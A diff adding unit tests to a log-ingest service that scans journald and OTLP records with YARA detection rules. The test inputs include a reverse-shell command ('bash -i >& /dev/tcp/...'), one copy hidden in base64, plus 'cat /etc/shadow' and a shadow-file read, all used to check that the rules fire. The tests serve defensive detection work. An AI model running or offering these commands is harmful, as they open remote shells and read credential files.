@@ -665,11 +665,21 @@ rule SSHD_Brute_Force : auth {
     // Malformed OTLP AnyValue variants -> 400 without falling back to NDJSON
     const sentCountBeforeMalformed = sentBatches.length;
     for (const badAnyVal of [
+      "cat /etc/shadow",
+      123,
+      ["x"],
+      { unknownField: "x" },
+      { stringValue: "a", intValue: 1 },
       { stringValue: { toString: 123 } },
       { boolValue: "yes" },
       { intValue: {} },
-      { doubleValue: "NaN" },
+      { intValue: "99999999999999999999999999999" },
+      { doubleValue: "not-a-double" },
+      { doubleValue: "0x10" },
       { bytesValue: "not valid base64!!!" },
+      { bytesValue: "abcde" },
+      { bytesValue: "abc==" },
+      { bytesValue: "+-_/" },
     ]) {
       const badRes = await handler.fetch(
         new Request("https://ingest.example/v1/logs", {
@@ -886,6 +896,182 @@ rule SSHD_Brute_Force : auth {
       agent: "kunai",
       "otel.scope.name": "journald-receiver",
     });
+  });
+
+  it("promotes embedded MESSAGE JSON fields, scans shadowed and extra fields, and falls back unknown embedded service aliases", async () => {
+    const { handler, env, sentBatches } = makeTestHarness();
+    const reverseShellEmbedded = JSON.stringify({
+      message: "command completed",
+      cmdline: "bash -i >& /dev/tcp/192.0.2.1/4444",
+      exe: "/bin/bash",
+    });
+    const shadowReadEmbedded = JSON.stringify({
+      message: "read succeeded",
+      target: "/etc/shadow",
+    });
+
+    const flatRes = await handler.fetch(
+      new Request("https://ingest.example/v1/logs", {
+        method: "POST",
+        headers: {
+          authorization: "Bearer test-secret-token-12345",
+          "content-type": "application/json",
+        },
+        body: JSON.stringify([
+          { MESSAGE: reverseShellEmbedded },
+          {
+            _CMDLINE: "/usr/bin/dockerd",
+            _EXE: "/usr/bin/dockerd",
+            MESSAGE: reverseShellEmbedded,
+          },
+          { MESSAGE: shadowReadEmbedded },
+        ]),
+      }),
+      env,
+    );
+    expect(flatRes.status).toBe(202);
+    expect(await flatRes.json()).toEqual({ accepted: 3, matched: 3 });
+
+    const flatBatch = sentBatches[0]!;
+    expect(flatBatch).toHaveLength(3);
+    for (const rec of flatBatch) {
+      assertMatchesBasinSchema(rec);
+    }
+
+    // Promoted cmdline/exe detected and exposed in canonical columns
+    expect(flatBatch[0]!.message).toBe("command completed");
+    expect(flatBatch[0]!.cmdline).toBe("bash -i >& /dev/tcp/192.0.2.1/4444");
+    expect(flatBatch[0]!.exe).toBe("/bin/bash");
+    expect(flatBatch[0]!.yara_rules).toContain("Linux_Reverse_Shell_Indicator");
+
+    // Outer _CMDLINE/_EXE occupy canonical columns; shadowed embedded values preserved & scanned
+    expect(flatBatch[1]!.message).toBe("command completed");
+    expect(flatBatch[1]!.cmdline).toBe("/usr/bin/dockerd");
+    expect(flatBatch[1]!.exe).toBe("/usr/bin/dockerd");
+    expect(flatBatch[1]!.yara_rules).toContain("Linux_Reverse_Shell_Indicator");
+    expect(JSON.parse(flatBatch[1]!.attributes_json!)).toMatchObject({
+      cmdline: "bash -i >& /dev/tcp/192.0.2.1/4444",
+      exe: "/bin/bash",
+    });
+
+    // Extra field in embedded MESSAGE preserved in attributes_json and scanned
+    expect(flatBatch[2]!.message).toBe("read succeeded");
+    expect(flatBatch[2]!.yara_rules).toContain("Linux_Credential_Access_Attempt");
+    expect(JSON.parse(flatBatch[2]!.attributes_json!)).toMatchObject({
+      target: "/etc/shadow",
+    });
+
+    // Embedded unknown_service:* in service_name falls back to valid service.name in same JSON
+    const serviceAliasRes = await handler.fetch(
+      new Request("https://ingest.example/v1/logs", {
+        method: "POST",
+        headers: {
+          authorization: "Bearer test-secret-token-12345",
+          "content-type": "application/json",
+        },
+        body: JSON.stringify({
+          resourceLogs: [
+            {
+              scopeLogs: [
+                {
+                  scope: { name: "journald-receiver" },
+                  logRecords: [
+                    {
+                      body: {
+                        stringValue: JSON.stringify({
+                          message: "embedded alias check",
+                          service_name: "unknown_service:logger",
+                          "service.name": "valid-embedded-service",
+                        }),
+                      },
+                    },
+                  ],
+                },
+              ],
+            },
+          ],
+        }),
+      }),
+      env,
+    );
+    expect(serviceAliasRes.status).toBe(202);
+    const aliasRec = sentBatches[1]![0]!;
+    assertMatchesBasinSchema(aliasRec);
+    expect(aliasRec.service_name).toBe("valid-embedded-service");
+  });
+
+  it("accepts ProtoJSON unpadded/URL-safe/empty bytesValue and special doubleValue literals", async () => {
+    const { handler, env, sentBatches } = makeTestHarness();
+    const binaryPayload = Buffer.from(
+      new Uint8Array([0xff, 0xfb, ...Buffer.from("bash -i >& /dev/tcp/10.0.0.1/4444", "utf8")]),
+    );
+    const paddedStdB64 = binaryPayload.toString("base64");
+    expect(paddedStdB64.endsWith("=")).toBe(true);
+    const unpaddedStdB64 = paddedStdB64.replace(/=+$/, "");
+    const urlSafeB64 = binaryPayload.toString("base64url");
+    expect(urlSafeB64.includes("_") || urlSafeB64.includes("-")).toBe(true);
+
+    const res = await handler.fetch(
+      new Request("https://ingest.example/v1/logs", {
+        method: "POST",
+        headers: {
+          authorization: "Bearer test-secret-token-12345",
+          "content-type": "application/json",
+        },
+        body: JSON.stringify({
+          resourceLogs: [
+            {
+              scopeLogs: [
+                {
+                  scope: { name: "protojson-test" },
+                  logRecords: [
+                    {
+                      body: { bytesValue: unpaddedStdB64 },
+                      attributes: [
+                        { key: "metric_nan", value: { doubleValue: "NaN" } },
+                        { key: "metric_pos_inf", value: { doubleValue: "Infinity" } },
+                      ],
+                    },
+                    {
+                      body: { bytesValue: urlSafeB64 },
+                      attributes: [
+                        { key: "metric_neg_inf", value: { doubleValue: "-Infinity" } },
+                      ],
+                    },
+                    {
+                      body: { bytesValue: "" },
+                    },
+                    {
+                      body: { doubleValue: "NaN" },
+                    },
+                  ],
+                },
+              ],
+            },
+          ],
+        }),
+      }),
+      env,
+    );
+
+    expect(res.status).toBe(202);
+    expect(await res.json()).toEqual({ accepted: 4, matched: 2 });
+    const records = sentBatches[0]!;
+    expect(records).toHaveLength(4);
+    for (const rec of records) {
+      assertMatchesBasinSchema(rec);
+    }
+    expect(records[0]!.yara_rules).toContain("Linux_Reverse_Shell_Indicator");
+    expect(JSON.parse(records[0]!.attributes_json!)).toMatchObject({
+      metric_nan: "NaN",
+      metric_pos_inf: "Infinity",
+    });
+    expect(records[1]!.yara_rules).toContain("Linux_Reverse_Shell_Indicator");
+    expect(JSON.parse(records[1]!.attributes_json!)).toMatchObject({
+      metric_neg_inf: "-Infinity",
+    });
+    expect(records[2]!.message).toBe("");
+    expect(records[3]!.message).toBe("NaN");
   });
 
   it("maintains bounded WASM heap across 500 repeated scans including empty and oversized payloads", () => {
